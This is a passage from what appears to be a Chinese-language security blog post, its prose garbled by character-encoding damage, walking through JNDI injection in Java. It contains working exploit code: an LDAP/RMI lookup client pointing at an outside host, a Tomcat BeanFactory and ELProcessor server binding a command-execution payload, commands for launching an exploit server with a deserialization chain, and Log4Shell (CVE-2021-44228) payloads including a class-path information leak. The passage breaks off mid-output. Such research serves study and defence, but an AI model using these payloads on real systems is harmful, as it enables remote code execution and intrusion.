org.omg.CORBA.IRObject;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext ic= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//ic.lookup(&quot;rmi://111.230.38.159:1099/EvilObj&quot;);</span></span><br><span class="line">        <span class="comment">//ic.lookup(&quot;rmi://192.168.20.1:1099/EvilObj&quot;);</span></span><br><span class="line">        ic.lookup(<span class="string">&quot;ldap://111.230.38.159:2234/EvilObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆåŠŸå¼¹å‡ºè®¡ç®—æœº</p><p>è°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æœ€ç»ˆçš„è¿è¡Œä½ç½®ä¸RMiç›¸åŒã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/13.png" class="" title="alt text"></p><h1 id="æ›´é«˜ç‰ˆæœ¬çš„ç»•è¿‡"><a href="#æ›´é«˜ç‰ˆæœ¬çš„ç»•è¿‡" class="headerlink" title="æ›´é«˜ç‰ˆæœ¬çš„ç»•è¿‡"></a>æ›´é«˜ç‰ˆæœ¬çš„ç»•è¿‡</h1><p>åƒLdapåªèƒ½ç»•è¿‡8u191ä¹‹å‰çš„JDKæˆ‘ä»¬è¿™é‡Œæ‰‹åŠ¨è°ƒä¸€ä¸‹<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/15.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶åœ¨è¿œç¨‹åŠ è½½codebaseçš„lodaClassä¸‹ä¹ŸåŠ äº†ä¸€ä¸ªtrustURLCodebaseè¿™ä¸ªå‚æ•°ã€‚è€Œè¿™ä¸ªå‚æ•°é»˜è®¤è‚¯å®šæ˜¯falseï¼Œå³å…¶ä¸å…è®¸æˆ‘ä»¬ä½¿ç”¨è¿œç«¯çš„codebaseæ¥åŠ è½½å·¥å‚</p><p>ä½†æ˜¯å…¶åªå°è¯•äº†å¯¹è¿œç¨‹åŠ è½½è¿›è¡Œäº†é™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨å…¶æœ¬åœ°çš„ç±»æ¥å°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>è€Œè¿™ä¸ªç±»æ˜¯è¦å®ç°äº†ObjectFactoryã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/23.png" class="" title="alt text"><br>æˆ‘ä»¬åœ¨è°ƒè¯•çš„æ—¶å€™å°±å¯ä»¥å‘ç°ï¼Œæ¯æ¬¡åœ¨è°ƒè¯•æ—¶éƒ½ä¼šè°ƒç”¨è¿™ä¸ªgetObjectInstanceæ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨å“ªäº›å®ç°äº†ObjectFactoryæ¥å£çš„getObjectInstanceæ–¹æ³•é‡Œå¯»æ‰¾æ˜¯å¦å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„éƒ¨åˆ†</p><h2 id="Tomcat9-62"><a href="#Tomcat9-62" class="headerlink" title="Tomcat9.62"></a>Tomcat9.62</h2><p>é¦–å…ˆåœ¨tomcat9.62åŠå…¶ä¹‹å‰ä¸‹å­˜åœ¨ä¸€ä¸ªç±»å®ç°äº†ObjectFactoryä¸”æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶åå°„æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬è¦å…ˆäº†è§£ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„å§¿åŠ¿ï¼Œåˆ©ç”¨ELProcessoræ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br>ELProcessorå†…å­˜åœ¨ä¸€ä¸ªevalæ–¹æ³•ï¼Œå…¶ä¼šå¯¹å‘½ä»¤è¿›è¡Œåå°„è°ƒç”¨ï¼Œæˆ‘è¿™é‡Œå†™ä¸ªdemo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.el.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ELProcessor</span> <span class="variable">processor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ELProcessor</span>();</span><br><span class="line">        processor.eval(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/19.png" class="" title="alt text"><br>æˆ‘ä»¬åœ¨evalä¸‹æ‰“ä¸ªæ–­ç‚¹ç®€å•è°ƒè¯•ä¸€ä¸‹ï¼Œä¼šå‘ç°å…¶æœ€ååˆ©ç”¨äº†åå°„çš„æ–¹æ³•è¿›è¡Œäº†å‘½ä»¤æ‰§è¡Œ<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/20.png" class="" title="alt text"></p><p>æˆ‘ä»¬æŠŠè§†çº¿é‡æ–°è½¬åˆ°å®ç°äº†ObjectFactoryçš„å¯åˆ©ç”¨ç±»ä¸‹ã€‚</p><p>è¿™ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„ç±»å°±æ˜¯tomcatçš„BeanFactoryç±»<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/21.png" class="" title="alt text"></p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/22.png" class="" title="alt text"><p>æœ€ç»ˆå…¶ä¼šåœ¨BeanFactoryä¸‹çš„ä¸€ä¸ªåå°„ç±»è°ƒç”¨è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œè€Œè¿™äº›å‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šé€šè¿‡è°ƒè¯•æ”»å‡»è¿‡ç¨‹çš„æ–¹å¼æ¥ï¼Œè®²è¿°æ¼æ´çš„è§¦å‘è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;1.94.186.199&quot;);//å¦‚æœè¦åœ¨æœåŠ¡å™¨ä¸Šå…è®¸éœ€è¦åŠ ä¸Šè¿™ä¸€æ¡ä»£ç ã€‚</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªResourceRefå¯¹è±¡ï¼Œå…¶ä¼ å…¥çš„Classä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ä¸ºorg.apache.naming.factory.BeanFactory</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));<span class="comment">//æ·»åŠ RefAddrå¯¹è±¡ï¼Œå‰ä¸€ä¸ªå‚æ•°æ˜¯é”®å€¼Typeã€‚åœ¨BeanFactoryç±»å†…ä¼šè¢«å–å‡ºå€¼</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));<span class="comment">//åŒä¸Š</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;Tomcat9.62&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registryè¿è¡Œä¸­......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext ic= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;rmi://192.168.20.1:1099/Tomcat9.62&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢å®ä¾‹åŒ–å·¥å‚çš„éƒ¨åˆ†ä¸RMIå’ŒLdapçš„å¤§åŒå°å¼‚ã€‚</p><p>ä¼šè¿›å…¥NamingManagerä¸‹çš„getObjectInstanceæ¥è¿›è¡Œå®ä¾‹åŒ–<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/23.png" class="" title="alt text"></p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/24.png" class="" title="alt text">å¦‚ä½•å¾—åˆ°å·¥å‚çš„ç±»åå†é€šè¿‡forNameæ¥åŠ è½½ç±»<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/26.png" class="" title="alt text"><p>æœ€åå®ä¾‹åŒ–å¾—åˆ°äº†å·¥å‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/27.png" class="" title="alt text"></p><p>å¾—åˆ°å·¥å‚åä¼šèµ°åˆ°å¦‚ä¸‹ä»£ç ä»è€Œè¿›å…¥BeanFactoryçš„getObjectInstance<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/33.png" class="" title="alt text"><br>å…¶ä¼ å…¥çš„å‚æ•°refï¼Œå°±æ˜¯æˆ‘ä»¬å†Serverä¸­å®ä¾‹åŒ–çš„ResourceRefç±»å€¼å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef[className=javax.el.ELProcessor,factoryClassLocation=<span class="literal">null</span>,factoryClassName=org.apache.naming.factory.BeanFactory,&#123;type=scope,content=&#125;,&#123;type=auth,content=&#125;,&#123;type=singleton,content=<span class="literal">true</span>&#125;,&#123;type=forceString,content=faster=eval&#125;,&#123;type=faster,content=Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)&#125;]</span><br></pre></td></tr></table></figure><br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/28.png" class="" title="alt text"><br>è€Œåå…¶é€šè¿‡ref.getClassName()æ¥è·å–æˆ‘ä»¬ResourceRefç±»çš„å†…éƒ¨çš„resourceClassåï¼Œå³æˆ‘ä»¬åœ¨Serverä¸­ä¼ å…¥çš„javax.el.ELProcessorã€‚<br>è€Œåé€šè¿‡ç±»åŠ è½½å…¶æ¥å¾—åˆ°è¿™ä¸ªç±»ã€‚å‘½åä¸ºbeanClass<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/29.png" class="" title="alt text"><br>ä¹‹åå°†beanClasså®ä¾‹åŒ–ä¸ºbeanã€‚<br>å†è·å–refå†…Typeä¸ºforceStringçš„å†…å®¹èµ‹å€¼ç»™raï¼Œè€ŒforceStringçš„å†…å®¹ä¸ºfaster=evalã€‚</p><p>è€Œååˆåˆ›å»ºäº†ä¸€ä¸ªHashMapï¼Œå˜é‡åä¸ºforcedã€‚</p><p>ç„¶åè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œå°†raçš„getContentå–å‡ºä¼ å…¥Valueï¼Œè€Œåå°†valueçš„å†…å®¹<code>faster=eval</code>æ”¾å…¥æ•°ç»„<code>arr$</code>å†…ã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/30.png" class="" title="alt text"><br>åé¢åˆå°†æ•°ç»„å†…çš„å€¼å–å‡ºèµ‹å€¼ç»™paramï¼Œç„¶åæˆªå–=å‰çš„æ‰€æœ‰å­—ç¬¦èµ‹å€¼ä¸ºparamï¼Œä¹‹åçš„èµ‹å€¼ä¸ºpropName<br>ç„¶åå°†paramä½œä¸ºé”®æ”¾å…¥åˆ°ä¹‹å‰å®šä¹‰çš„map forcedä¸­ï¼Œå…¶å€¼ä¸ºä¸€ä¸ªåå°„è°ƒç”¨ï¼Œå…¶è°ƒç”¨çš„ï¼Œ<code>beanClass.getMethod(propName, paramTypes)</code>,å…¶æ”¾å°„è·å–çš„å†…å®¹å°±æ˜¯ELProcessorä¸‹çš„evalæ–¹æ³•ã€‚</p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/31.png" class="" title="alt text"><p>ä¹‹åè¿›å…¥ä¸€ä¸ªdo whileå¾ªç¯ã€‚è¿™ä¸ªå¾ªç¯ä¼šè·å–refä¸­çš„Typeé”®çš„å€¼ã€‚ç›´åˆ°è·å–åˆ°éè§„å®šå†…å®¹çš„Typeçš„é”®å€¼å¯¹ã€‚å³å…¶å°†raå®šä¹‰ä¸ºæˆ‘ä»¬çš„ä¼ å…¥çš„é‚£ä¸ªStringRefAddr<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/33.png" class="" title="alt text"><br>æœ€ç»ˆä¼šå°†propNameèµ‹å€¼ä¸ºæˆ‘ä»¬å®šä¹‰çš„Type:<code>faster</code></p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/32.png" class="" title="alt text"><p>æœ€åå…¶å†ä»Mapä¸­æ‹¿å‡ºé”®ä¸ºfasterçš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„evalæ–¹æ³•ã€‚<br>è€Œå…¶valueè·å–raçš„Contentï¼Œå…¶å€¼å°±æ˜¯æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„ä»£ç ã€‚<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code><br>æœ€åæ”¾å°„è°ƒç”¨çš„ä»£ç å…¶å®å°±æ˜¯ <code>eval.invoke(bean,&#39;Runtime.getRuntime().exec(&quot;calc&quot;)&#39;)</code>beanä¹Ÿå°±æ˜¯ELProcessorçš„å®ä¾‹ã€‚</p><p>è¿™æ ·å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/35.png" class="" title="alt text"><br>åœ¨tomcatçš„9.62ä¹‹åçš„ç‰ˆæœ¬é‡Œï¼Œå…¶å°†ä¹‹å‰çš„method.invoke(bean,valueArray)ç›´æ¥è¿›è¡Œäº†åˆ é™¤ï¼Œè¿™å°±åˆ°å¯¼è‡´äº†æˆ‘ä»¬æ— æ³•åœ¨ä½¿ç”¨ä¹‹å‰çš„æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><h2 id="åŸç”Ÿååºåˆ—åŒ–"><a href="#åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="åŸç”Ÿååºåˆ—åŒ–"></a>åŸç”Ÿååºåˆ—åŒ–</h2><p>JNDIæ³¨å…¥é€šè¿‡Ldapçš„æ–¹æ³•æ˜¯å¯ä»¥è§¦å‘ååºåˆ—çš„ã€‚</p><p>å‰é¢æˆ‘å†™çš„Ldapé«˜ç‰ˆæœ¬çš„æ³¨å…¥çš„expæ˜¯è‡ªå·±æ­å»ºçš„LdapæœåŠ¡å™¨,ä½†è¿™æ ·å¤ªè¿‡äºéº»çƒ¦,äºæ˜¯æˆ‘å°è¯•å†ç½‘ä¸Šæ‰¾é¡¹ç›®,äºæ˜¯æˆ‘ä¾¿æ‰¾åˆ°äº†å¦‚ä¸‹é¡¹ç›®ã€‚<br><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/tree/master">JNDI-Exploit-Bypass-Demo</a><br>ä½¿ç”¨è¿™ä¸ªé¡¹ç›®éœ€è¦æˆ‘ä»¬è‡ªå·±è¿›è¡Œæ‰“åŒ…<br>é£Ÿç”¨æ–¹æ³•<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mvn package</span><br><span class="line">java -cp HackerRMIRefServer-all.jar HackerRMIRefServer 0.0.0.0 8088 1099</span><br><span class="line">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  0.0.0.0 8088 1389</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªé¡¹ç›®å†…æœ‰ä¸ªLdapååºåˆ—åŒ–è§¦å‘çš„javaæ–‡ä»¶æˆ‘ä»¬æ‰“æ‰“åŒ…å‰è¦å¯¹å…¶è¿›è¡Œä¿®æ”¹<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/36.png" class="" title="alt text"><br>å°†å…¶ååºåˆ—åŒ–çš„payloadè¿›è¡Œæ›´æ”¹ï¼Œæˆ‘è¿™é‡Œæ”¹æˆäº†CC1çš„é“¾</p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/37.png" class="" title="alt text"><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/38.png" class="" title="alt text"><p>å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä¹Ÿæ˜¾ç¤ºäº†è¯·æ±‚è®°å½•<br>æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹å®¢æˆ·ç«¯ã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/39.png" class="" title="alt text"><br>å‰åŠéƒ¨åˆ†éƒ½ç›¸åŒï¼Œè€Œåé¢å…¶æ£€æµ‹äº†ä¼ å…¥å€¼attrsçš„<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>å±æ€§ã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/41.png" class="" title="alt text"><br>è€Œè¿™ä¸ª<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>å¾—åˆ°çš„å°±æ˜¯å­—ç¬¦ä¸²javaSerializedData<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/39.png" class="" title="alt text"><br>è€Œåä¼šè¿›å…¥deserialzeObjectæ–¹æ³•<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/40.png" class="" title="alt text"><br>è¿™å°±æ˜¯æ ‡å‡†çš„ååºåˆ—åŒ–äº†ã€‚<br>è¿™æ ·å°±è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</p><h1 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h1><h2 id="JNDIçš„æˆå› "><a href="#JNDIçš„æˆå› " class="headerlink" title="JNDIçš„æˆå› "></a>JNDIçš„æˆå› </h2><p>åœ¨log4j2çš„2.0-beta9 åˆ° 2.15.0ï¼ˆä¸åŒ…æ‹¬å®‰å…¨ç‰ˆæœ¬ 2.12.2ã€2.12.3 å’Œ 2.3.1ï¼‰ç‰ˆæœ¬å†…å­˜åœ¨ç€JNDIæ³¨å…¥çš„CVE-2021-44228</p><p>æ”¹æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¾ˆç®€å•ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://111.xxx.xxx.159:389/EvilObj&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;hello &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>èµ·ä¸€ä¸ªJNDIæœåŠ¡å™¨ç„¶åè¿è¡Œä¸Šé¢çš„è„šæœ¬å°±ä¼šå‘ç°æˆåŠŸå‘½ä»¤æ‰§è¡Œ<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/44.png" class="" title="alt text"><br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/43.png" class="" title="alt text"></p><p>log4j2çš„æ¼æ´ä¸»è¦å‡ºç°åœ¨ org.apache.logging.log4j.core.lookup.StrSubstitutorç±»ä¸Šã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/47.png" class="" title="alt text"><br>è¿™ä¸ªç±»ä¼šå…ˆå †<code>$&#123;</code>è¿›è¡ŒåŒ¹é…<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/46.png" class="" title="alt text"><br>ç„¶åå†åŒ¹é…å°¾éƒ¨<code>&#125;</code><br>ä»¥æ­¤æ¥æå–å†…éƒ¨çš„å€¼<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/52.png" class="" title="alt text"></p><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/54.png" class="" title="alt text"><p>ç„¶åä¼šè¿›å…¥resolveVariableæ¥è§¦å‘Interpolatorçš„lookup<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/51.png" class="" title="alt text"><br>lookupæ–¹æ³•ä¼šåŒ¹é…: å³æå–å‡ºå‰é¢çš„JNDIã€‚<br>é€šè¿‡strLookupMapæ¥æå–å‡º:å‰å…³é”®è¯çš„ç±»ã€‚èµ‹å€¼ç»™lookupï¼Œç„¶åé€šè¿‡lookup.lookupæ¥è°ƒç”¨èµ·åœ°ä¸‹çš„lookup<br>æˆ‘ä»¬å¯»æ‰¾è¿™ä¸ªstrLookupMapå¯ä»¥å‘ç°å¦‚ä¸‹ã€‚<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/55.png" class="" title="alt text"><br>JNDIå…³é”®è¯æŒ‡å‘çš„ç±»å°±æ˜¯org.apache.logging.log4j.core.lookup.JndiLookup<br>æ‰€ä»¥lookup.lookupä¼šæŒ‡å‘JndiLookup.lookup<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/53.png" class="" title="alt text"><br>JndiLookup.lookupä¸‹ä¼šé€šè¿‡jndiManager.lookupæ¥è¿›è¡ŒJNDIçš„åŠ è½½ã€‚<br>æ‰€ä»¥è¿™ä¸ªlog4jå¯ä»¥é€šè¿‡${jndi:ldap://xxxx}<br>å°±å¯ä»¥è¿›è¡Œjndiæ³¨å…¥</p><h2 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h2><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/56.png" class="" title="alt text"><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°mapè¿˜æœ‰æŒ‡å‘å…¶ä»–çš„ç±»ã€‚å¦‚sys<br>æˆ‘ä»¬æ‰“å¼€å…¶æŒ‡å‘çš„ç±»<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/57.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹åˆ°å…¶ç›´æ¥è¿”å›äº†System.getPropertyè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¿¡æ¯æ¢æµ‹ã€‚å¦‚è¾“å…¥çš„keyä¸ºjava.class.pathå°±å¯ä»¥å¾—åˆ°å…¶åŠ è½½çš„æ‰€æœ‰ä¾èµ–çš„ç‰ˆæœ¬ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;sys:java.class.path&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;hello &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">----------------------------------</span><br><span class="line"><span class="number">10</span>:<span class="number">39</span>:<span class="number">41.693</span> [main] ERROR log4j.Log4j - hello C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\charsets.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\access-bridge-<span class="number">64.</span>jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\cldrdata.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\dnsns.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\jaccess.jar;C:\Program 